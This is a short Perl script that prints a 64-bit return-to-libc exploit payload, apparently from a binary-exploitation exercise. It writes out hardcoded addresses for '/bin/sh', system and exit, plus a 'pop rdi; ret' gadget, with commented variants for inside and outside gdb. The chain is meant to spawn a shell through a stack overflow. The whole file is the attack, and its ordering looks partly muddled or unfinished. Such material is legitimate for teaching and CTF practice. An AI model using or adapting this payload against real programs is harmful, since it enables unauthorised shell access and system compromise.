#!/usr/bin/perl

#0x00 00 7f ff f7 b9 a1 77
# Address of /bin/sh
print "\x77\xa1\xb9\xf7\xff\x7f\x00\x00";

# Out of gdb
#0x00 00 7F FF F7 B9 A1 B7
#print "\xb7\xa1\xb9\xf7\xff\x7f\x00\x00";
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#0x00 00 7f ff f7 a5 33 90
# Address of System
print "\x90\x33\xa5\xf7\xff\x7f\x00\x00";

# Out of gdb
#0x00 00 7F FF F7 A5 33 D0
#print "\xd0\x33\xa5\xf7\xff\x7f\x00\x00";
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#0x00 00 7f ff f7 a4 80 30
# Address of exit
print "\x30\x80\xa4\xf7\xff\x7f\x00\x00";

# Out of gdb
#0x00 00 7f ff f7 a4 80 70
#print "\x70\x80\xa4\xf7\xff\x7f\x00\x00";
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#0x00 00 00 00 00 40 06 e3
# pop rdi; ret;
print "\xe3\x06\x40\x00\x00\x00\x00\x00";
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#0x00 00 7f ff ff ff de 30
# Address of path in stack
#print "\x30\xde\xff\xff\xff\x7f\x00\x00";
print "\x77\xa1\xb9\xf7\xff\x7f\x00\x00";

# Out of gdb
#print "\x80\xde\xff\xff\xff\x7f\x00\x00";
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#0x00 00 7f ff f7 a5 33 90
# Address of System
print "\x90\x33\xa5\xf7\xff\x7f\x00\x00";

# Out of gdb
#0x00 00 7F FF F7 A5 33 D0
#print "\xd0\x33\xa5\xf7\xff\x7f\x00\x00";
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#0x00 00 7f ff f7 a4 80 30
# Address of exit
print "\x30\x80\xa4\xf7\xff\x7f\x00\x00";

# Out of gdb
#0x00 00 7f ff f7 a4 80 70
#print "\x70\x80\xa4\xf7\xff\x7f\x00\x00";

